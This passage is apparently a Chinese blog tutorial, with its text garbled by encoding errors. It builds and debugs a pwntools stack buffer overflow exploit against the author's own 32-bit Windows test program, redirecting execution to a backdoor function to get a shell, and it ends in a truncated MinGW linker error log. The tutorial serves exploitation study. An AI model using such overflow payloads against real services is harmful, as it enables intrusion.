<p>åœ¨ <code>github</code> ä¸Šæœ‰ä¸€ä¸ªé¡¹ç›®ç”¨æ¥æ£€æµ‹å¯æ‰§è¡Œæ–‡ä»¶ï¼ˆæ”¯æŒ <code>ELF</code> å’Œ <code>PE</code> ï¼‰çš„ä¿æŠ¤æœºåˆ¶ï¼Œåœ¨ <a target="_blank" rel="noopener" href="https://github.com/Wenzel/checksec.py/releases/tag/v0.7.1">è¿™é‡Œ</a> å¯ä»¥ç›´æ¥ä¸‹è½½ <code>checksec.exe</code> ï¼Œä½¿ç”¨æ–¹æ³• <code>checksec.exe &lt;file_or_directory&gt;</code> ã€‚ç”¨è¯¥å·¥å…·æ£€æµ‹ä¸‹ä¸Šé¢ç¼–è¯‘å‡ºæ¥ç¨‹åºçš„å®‰å…¨å±æ€§</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091057489.png" alt="image-20240309105757431"></p>
<p>åœ¨ <code>main</code> å‡½æ•°çš„ä¼ªä»£ç éƒ¨åˆ†å’Œæºä»£ç æ²¡æœ‰å¤ªå¤§åŒºåˆ«ï¼Œè€Œå’Œ <code>Linux</code> ä¸‹æ˜æ˜¾ä¸ä¸€æ ·çš„åœ°æ–¹æ˜¯å·¦ä¾§çš„å‡½æ•°æ ï¼Œå‡ºç°äº†å¾ˆå¤šéè‡ªå®šä¹‰å‡½æ•°ï¼ˆå»ç¬¦å·ï¼Œæ²¡å»ç¬¦å·çš„éƒ½æœ‰ï¼‰ã€‚<code>Linux</code> å‡½æ•°ä¸­è™½ç„¶ä¹Ÿæœ‰é¢å¤–çš„å‡½æ•°ä½†æ¯” <code>windows</code> ä¸‹ç¼–è¯‘å‡ºæ¥çš„å°‘äº†å¾ˆå¤šã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091046783.png" alt="image-20240309104632628"></p>
<p>åœ¨æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œè°ƒè¯•æ˜¯æå…¶é‡è¦çš„ä¸€ç¯ã€‚è°ƒè¯•å¤§æ¦‚åˆåˆ†æˆä¸¤ç§ï¼Œåˆ†åˆ«ä»å¤´å¼€å§‹è°ƒè¯•ç¨‹åºå’Œé™„åŠ è¿›ç¨‹è°ƒè¯•ã€‚åè€…åœ¨æ¼æ´åˆ©ç”¨å’ŒéªŒè¯æ—¶ä½¿ç”¨çš„æ›´é¢‘ç¹ä¸€äº›ï¼Œå¸¸å¸¸è¦é…åˆ <code>python</code> ç¼–å†™çš„æ”»å‡»è„šæœ¬åœ¨å‘é€æ•°æ®å‰åé™„åŠ åˆ°è¿›ç¨‹ä¸Šè°ƒè¯•ã€‚</p>
<p>ä»¥ç¼–å†™ä¸Šé¢ä»£ç çš„æ”»å‡»è„šæœ¬ä¸ºä¾‹ï¼Œè¿›è¡Œé™„åŠ è¿›ç¨‹è°ƒè¯•çš„æ“ä½œã€‚</p>
<p><code>gets</code> è¯»å…¥æ•°æ®åˆ° <code>v4</code> ï¼Œå…¶è·ç¦»è¿”å›åœ°å€ä¸º <code>0x10+0x4</code> å­—èŠ‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091103656.png" alt="image-20240309110329592"></p>
<p>åœ¨åƒåœ¾æ•°æ®åé¢å¡«å…¥åé—¨å‡½æ•°çš„åœ°å€ <code>0x00401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091107575.png" alt="image-20240309110749504"></p>
<p>å¯ä»¥ç¼–å†™å¦‚ä¸‹ <code>EXP</code> ï¼Œè§£é‡Šä¸‹è¿™ä¸ª <code>remote</code> ï¼Œè¿™é‡Œä½¿ç”¨äº† <code>Ex</code> å¸ˆå‚…ç¼–å†™çš„å·¥å…· <a target="_blank" rel="noopener" href="https://github.com/Ex-Origin/win_server">win_server</a> ï¼Œè¯¥å·¥å…·å¯ä»¥å°†ç¨‹åºå¯åŠ¨å¹¶æ˜ å°„åœ¨æŒ‡å®šç«¯å£ä¸Šã€‚å’Œéƒ¨ç½² <code>pwn</code> é¢˜ç±»ä¼¼ï¼Œç”¨ <code>nc</code> æˆ–è€… <code>pwntools</code> ä¸­çš„ <code>remote</code> å‡½æ•°å¯ä»¥å’ŒæŒ‚èµ·çš„ç¨‹åºè¿›è¡Œäº¤äº’ã€‚</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(<span class="number">0x00401410</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>æ•°æ®å‘é€åå‘ç°æ²¡æ‰“é€š</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091950101.png" alt="image-20240309195033732"></p>
<h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>æˆ‘é€‰æ‹©ç”¨ <code>x32dbg</code> è¿›è¡Œçš„è°ƒè¯•ï¼Œå› ä¸ºæˆ‘åœ¨ <code>exp</code> ä¸­å‘é€ <code>payload</code> ä¹‹å‰ä½¿ç”¨äº† <code>pause</code> ã€‚æ­¤æ—¶ç›®æ ‡è¿›ç¨‹ä¹Ÿè¢«é˜»å¡äº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å°±æ˜¯å…ˆè¿è¡Œ <code>exp</code> å¹¶ç”¨ <code>pause</code> å¡ä½</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091956903.png" alt="image-20240309195658678"></p>
<p>åœ¨ <code>x32dbg</code> ä¸­é€‰æ‹©é™„åŠ </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091957456.png" alt="image-20240309195720377"></p>
<p>æœç´¢åç¡®å®š <code>test</code> è¿›ç¨‹å·ä¸º <code>41380</code> ï¼Œç‚¹å‡»é™„åŠ </p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958293.png" alt="image-20240309195804217"></p>
<p>åŠ è½½åˆ°è¿›ç¨‹åï¼Œè°ƒè¯•å™¨ç•Œé¢å¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403091958974.png" alt="image-20240309195858776"></p>
<p>æœ€åˆæˆ‘å‘ç°æ— è®ºå¦‚ä½• <code>x32dbg</code> ä¹Ÿæ— æ³•è°ƒè¯•åˆ° <code>test</code> ç¨‹åºçš„ä»£ç æ®µï¼ŒåŠ ä¹‹è¯¥è°ƒè¯•å™¨åˆšå¼€å§‹ç”¨ï¼Œä¸å¤ªç†Ÿæ‚‰ã€‚å› æ­¤å°±ç”¨äº†ä¸€ä¸ªæ¯”è¾ƒç¬¨çš„æ–¹æ³•ï¼Œå»æœç´¢ç¨‹åºä¸­å‡ºç°çš„å­—ç¬¦ä¸² <code>input &gt;&gt;</code> ï¼ˆåæ¥çŸ¥é“ <code>ctrl+g</code> å¯ä»¥ç›´æ¥è·³è½¬è‡³æŒ‡å®šåœ°å€å¤„ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092005655.png" alt="image-20240309200524449"></p>
<p>ç»è¿‡è¿‡æ»¤åå¯ä»¥æŸ¥çœ‹åˆ° <code>input &gt;&gt;</code> å­—ç¬¦ä¸²åœ°å€ä¸º <code>0x40143F</code> ï¼ŒåŒå‡»è¿›è¡Œè·³è½¬</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092007400.png" alt="image-20240309200734233"></p>
<p>æ­¤æ—¶å·²ç»æ˜¾ç¤ºå‡ºäº†ç¨‹åºçš„ä»£ç æ®µï¼Œå»å¯»æ‰¾ä¸€ä¸ªåˆé€‚çš„æ–­ç‚¹ä½ç½®ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092008776.png" alt="image-20240309200818584"></p>
<p>æˆ‘é€‰æ‹©å°†æ–­ç‚¹ä¸‹åˆ° <code>printf(&quot;data: %s\n&quot;, v4)</code> è¿™è¡Œä»£ç çš„ <code>call</code> æŒ‡ä»¤å¤„ï¼Œç‚¹å‡»è¯¥åœ°å€ï¼ŒæŒ‰ <code>F2</code> å½“åœ°å€æ ‡çº¢æ—¶ï¼Œè¯´æ˜æ–­ç‚¹ä¸‹æˆåŠŸäº†ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092010193.png" alt="image-20240309201026086"></p>
<p>æ­¤æ—¶è¦å°† <code>exp</code> çš„ <code>pause</code> å–æ¶ˆï¼Œ<code>payload</code> æ‰èƒ½å‘é€ï¼Œä¸ç„¶è¿›ç¨‹è¿˜æ˜¯ä¼šä¸€ç›´å¤„äºé˜»å¡çŠ¶æ€ã€‚å½“ç¨‹åºè¯»å–åˆ°è¾“å…¥åï¼Œä¼šä¸€ç›´è¿è¡Œï¼Œç›´åˆ°é‡è§ä¸‹çš„æ–­ç‚¹ååœæ­¢ã€‚æ­¤æ—¶å‘ç° <code>EIP</code> å¯„å­˜å™¨å·²ç»å˜æˆäº†æ–­ç‚¹å¤„çš„åœ°å€</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092013275.png" alt="image-20240309201311166"></p>
<p>æœ¬æ¬¡è°ƒè¯•çš„ç›®çš„æ˜¯ä¸ºäº†æ¢ç©¶ <code>exp</code> æ²¡æœ‰æ‰“é€šçš„åŸå› ï¼ŒçŒœæµ‹æ˜¯åç§»é‡çš„è®¡ç®—å¯èƒ½å‡ºäº†é—®é¢˜ã€‚è¿™ä¸ªä½ç½®å·²ç»æ˜¯ <code>gets</code> è¯»å…¥äº†æ•°æ®ï¼Œé‚£ä¹ˆåº”è¯¥å…³æ³¨å¯„å­˜å™¨å’Œæ ˆçš„çŠ¶æ€ã€‚åœ¨çº¢æ¡†çš„éƒ¨åˆ†ä¸­åˆ†åˆ«æ ‡æ³¨äº† <code>ebp</code> <code>esp</code> å¯„å­˜å™¨çš„å€¼ä»¥åŠæ ˆåŒºã€‚<code>0x61616161</code> æ˜¯åƒåœ¾æ•°æ® <code>a</code> ï¼Œè€Œ <code>ebp</code> å¯„å­˜å™¨æ˜¯ <code>0x0061FF28</code> ï¼Œåœ¨æ‰§è¡Œ <code>leave</code> æŒ‡ä»¤ï¼ˆç›¸å½“äº <code>mov esp,ebp</code> <code>pop ebp</code> ä¸¤æ¡æŒ‡ä»¤ï¼‰åï¼Œ<code>esp</code> ä¼šå¤„äºå½“å‰ <code>ebp</code> ä¸‹é¢ä¸€ä¸ªå†…å­˜å•å…ƒçš„ä½ç½®ï¼Œå¹¶ç”¨ <code>ret</code> æŒ‡ä»¤è·³è½¬è¯¥å†…å­˜å•å…ƒä¸­çš„åœ°å€ã€‚å†è§‚å¯Ÿæ ˆåŒºï¼Œå‘ç° <code>ebp</code> çš„ä½ç½®å¹¶æ²¡æœ‰è¢«åƒåœ¾æ•°æ®æ‰€è¦†ç›–ï¼Œè€Œæ˜¯åœ¨ <code>0x61FF24</code> å¤„å°±æˆªæ­¢äº†ã€‚å› æ­¤æ­£ç¡®è¦†ç›–è¿”å›åœ°å€çš„åç§»é‡åº”è¯¥åœ¨åŸæœ¬çš„åŸºç¡€ä¸ŠåŠ  <code>8</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092017695.png" alt="image-20240309201739605"></p>
<p>ä¿®æ”¹ <code>exp</code> åï¼Œå†è¿›è¡Œè°ƒè¯•</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">12345</span>)</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * (<span class="number">0x10</span>+<span class="number">0x4</span>+<span class="number">0x8</span>)</span><br><span class="line">payload += p32(<span class="number">0x00401410</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>æ­¤æ—¶å¯ä»¥çœ‹åˆ° <code>main</code> å‡½æ•°çš„è¿”å›åœ°å€å·²ç»è¢«ä¿®æ”¹æˆ <code>0x401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092030677.png" alt="image-20240309203000473"></p>
<p>æ‰§è¡Œå®Œ <code>ret</code> æŒ‡ä»¤åï¼Œæ‰§è¡Œæµå·²ç»è·³è½¬åˆ°åé—¨å‡½æ•°çš„èµ·å§‹åœ°å€ <code>0x401410</code></p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092031053.png" alt="image-20240309203118990"></p>
<p>é€€å‡ºè°ƒè¯•ï¼Œè®©ç¨‹åºè¿è¡Œå®Œæ¯•ï¼Œå‘ç°å·²ç»æ‹¿åˆ°äº† <code>shell</code> å¹¶ä¸”æ‰§è¡Œ <code>calc</code> å‘½ä»¤å¼¹å‡ºäº†è®¡ç®—å™¨ã€‚</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202403092032979.png" alt="image-20240309203237597"></p>
<h2 id="æŠ¥é”™è§£å†³"><a href="#æŠ¥é”™è§£å†³" class="headerlink" title="æŠ¥é”™è§£å†³"></a>æŠ¥é”™è§£å†³</h2><h3 id="windowsä¸‹gccç¼–è¯‘32ä½ç¨‹åºæŠ¥é”™"><a href="#windowsä¸‹gccç¼–è¯‘32ä½ç¨‹åºæŠ¥é”™" class="headerlink" title="windowsä¸‹gccç¼–è¯‘32ä½ç¨‹åºæŠ¥é”™"></a>windowsä¸‹gccç¼–è¯‘32ä½ç¨‹åºæŠ¥é”™</h3><p>åœ¨ <code>windows</code> ä¸­ç¼–è¯‘ <code>32</code> ä½çš„ç¨‹åºï¼Œä¼šå‡ºç°å¦‚ä¸‹æŠ¥é”™ï¼ˆç¼–è¯‘ <code>64</code> ä½çš„ç¨‹åºæ­£å¸¸ï¼‰ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\86137\Desktop&gt; gcc -m32 test.c -o test1.exe</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0\libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc_eh.a when searching for -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lgcc_eh</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmoldname.a when searching for -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmoldname</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingwex.a when searching for -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingwex</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmsvcrt.a when searching for -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmsvcrt</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.dll.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.dll.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libpthread.a when searching for -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lpthread</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libadvapi32.a when searching for -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -ladvapi32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libshell32.a when searching for -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lshell32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libuser32.a when searching for -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -luser32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libkernel32.a when searching for -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lkernel32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libiconv.a when searching for -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -liconv</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib\libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/lib/libmingw32.a when searching for -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: cannot find -lmingw32</span><br><span class="line">D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/../../../../x86_64-w64-mingw32/bin/ld.exe: skipping incompatible D:/mingw64/bin/../lib/gcc/x86_64-w64-mingw32/8.1.0/libgcc.a when searching for -lgcc</span><br><span 